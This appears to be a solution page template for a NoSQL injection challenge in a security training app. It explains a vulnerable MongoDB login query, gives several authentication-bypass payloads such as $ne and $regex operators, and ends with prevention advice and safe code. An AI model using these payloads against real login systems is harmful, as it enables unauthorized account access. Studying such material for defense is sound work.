@@ -1,0 +1,220 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 10{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 10 - NoSQL Injection</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a NoSQL injection vulnerability in a MongoDB-based application. Unlike traditional SQL injection, NoSQL injection exploits the query structure and operators specific to NoSQL databases.
+                </p>
+                <p>
+                    The vulnerability occurs because the application directly uses user input in MongoDB queries without proper validation or sanitization:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable code example (Node.js with Express and Mongoose)
+app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+  
+  // Vulnerable MongoDB query construction
+  const user = await User.findOne({
+    username: username,
+    password: password
+  });
+  
+  if (user) {
+    // User authenticated, create session
+    req.session.user = user;
+    return res.redirect('/dashboard');
+  } else {
+    // Authentication failed
+    return res.render('login', { error: 'Invalid username or password' });
+  }
+});</code></pre>
+                <p>
+                    The vulnerability is particularly dangerous because:
+                </p>
+                <ul>
+                    <li>NoSQL databases like MongoDB use a different query structure than SQL databases</li>
+                    <li>MongoDB operators like <code>$eq</code>, <code>$ne</code>, <code>$gt</code>, and <code>$regex</code> can be manipulated</li>
+                    <li>JSON structure can be exploited to change query logic</li>
+                    <li>Many developers are less familiar with NoSQL injection compared to SQL injection</li>
+                </ul>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Understanding MongoDB Query Operators</h4>
+                <p>
+                    MongoDB uses a variety of operators that can be manipulated for NoSQL injection. The most useful for authentication bypass is <code>$ne</code> (not equal), which can be used to match documents where a field does not equal a specified value.
+                </p>
+
+                <h4>2. Method 1: Using JSON Injection</h4>
+                <p>
+                    If the application accepts JSON input or converts form data to JSON, you can inject MongoDB operators directly:
+                </p>
+                <div class="alert alert-secondary">
+                    <p><strong>Username:</strong> <code>{"$ne": null}</code></p>
+                    <p><strong>Password:</strong> <code>{"$ne": null}</code></p>
+                </div>
+                <p>
+                    This transforms the query to:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>db.users.findOne({
+  username: {"$ne": null},
+  password: {"$ne": null}
+});</code></pre>
+                <p>
+                    This query will match the first user in the database where both username and password are not null, which is likely the admin user.
+                </p>
+
+                <h4>3. Method 2: Using URL Parameter Manipulation</h4>
+                <p>
+                    If the application doesn't accept JSON directly but processes URL parameters, you can use:
+                </p>
+                <div class="alert alert-secondary">
+                    <p><strong>Username:</strong> <code>admin</code></p>
+                    <p><strong>Password:</strong> <code>[$ne]=anyvalue</code></p>
+                </div>
+                <p>
+                    This might be interpreted as:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>db.users.findOne({
+  username: "admin",
+  password: {$ne: "anyvalue"}
+});</code></pre>
+                <p>
+                    This query will match the admin user as long as their password is not "anyvalue" (which it almost certainly isn't).
+                </p>
+
+                <h4>4. Method 3: Using Array Injection</h4>
+                <p>
+                    Another approach is to use array syntax:
+                </p>
+                <div class="alert alert-secondary">
+                    <p><strong>Username:</strong> <code>admin</code></p>
+                    <p><strong>Password[0]:</strong> <code>$ne</code></p>
+                    <p><strong>Password[1]:</strong> <code>anyvalue</code></p>
+                </div>
+                <p>
+                    This might be interpreted as:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>db.users.findOne({
+  username: "admin",
+  password: {$ne: "anyvalue"}
+});</code></pre>
+                <p>
+                    This achieves the same result as Method 2.
+                </p>
+
+                <h4>5. Method 4: Using Regex for Targeted Attacks</h4>
+                <p>
+                    For a more targeted approach, you can use the <code>$regex</code> operator:
+                </p>
+                <div class="alert alert-secondary">
+                    <p><strong>Username:</strong> <code>admin</code></p>
+                    <p><strong>Password:</strong> <code>{"$regex": ".*"}</code></p>
+                </div>
+                <p>
+                    This transforms the query to:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>db.users.findOne({
+  username: "admin",
+  password: {"$regex": ".*"}
+});</code></pre>
+                <p>
+                    This query will match the admin user regardless of their password, as the regex <code>.*</code> matches any string.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    NoSQL injection vulnerabilities are particularly relevant in modern applications:
+                </p>
+                <ul>
+                    <li><strong>Microservices Architecture</strong>: Many microservices use NoSQL databases for flexibility and scalability</li>
+                    <li><strong>Modern Web Applications</strong>: NoSQL databases are popular in modern web development stacks</li>
+                    <li><strong>Cloud-Native Applications</strong>: Many cloud-native applications use NoSQL databases</li>
+                    <li><strong>IoT Systems</strong>: NoSQL databases are often used in IoT applications for their scalability</li>
+                </ul>
+                <p>
+                    Notable real-world examples include:
+                </p>
+                <ul>
+                    <li><strong>Alibaba Cloud (2019)</strong>: A NoSQL injection vulnerability allowed attackers to access sensitive customer data</li>
+                    <li><strong>Rocket.Chat (2018)</strong>: A vulnerability in their MongoDB implementation allowed unauthorized access to private messages</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent NoSQL injection vulnerabilities, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Use Schema Validation</strong> to ensure inputs match expected types and formats:
+                        <pre class="bg-light p-3 rounded"><code>// Using Mongoose schema validation
+const UserSchema = new mongoose.Schema({
+  username: { type: String, required: true },
+  password: { type: String, required: true }
+});
+
+const User = mongoose.model('User', UserSchema);</code></pre>
+                    </li>
+                    <li>
+                        <strong>Use Parameterized Queries</strong> or query builders:
+                        <pre class="bg-light p-3 rounded"><code>// Safe code example using Mongoose
+app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+  
+  // Validate input types
+  if (typeof username !== 'string' || typeof password !== 'string') {
+    return res.render('login', { error: 'Invalid input types' });
+  }
+  
+  // Use Mongoose's query builder
+  const user = await User.findOne()
+    .where('username').equals(username)
+    .where('password').equals(password);
+  
+  if (user) {
+    // User authenticated, create session
+    req.session.user = user;
+    return res.redirect('/dashboard');
+  } else {
+    // Authentication failed
+    return res.render('login', { error: 'Invalid username or password' });
+  }
+});</code></pre>
+                    </li>
+                    <li>
+                        <strong>Sanitize and Validate All Input</strong>:
+                        <ul>
+                            <li>Check input types and reject unexpected types</li>
+                            <li>Validate input format using regular expressions</li>
+                            <li>Use input sanitization libraries specific to NoSQL databases</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Implement Proper Authentication</strong>:
+                        <ul>
+                            <li>Use secure password hashing (bcrypt, Argon2)</li>
+                            <li>Implement multi-factor authentication</li>
+                            <li>Use JWT or session-based authentication properly</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Apply the Principle of Least Privilege</strong> for database accounts
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level10') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
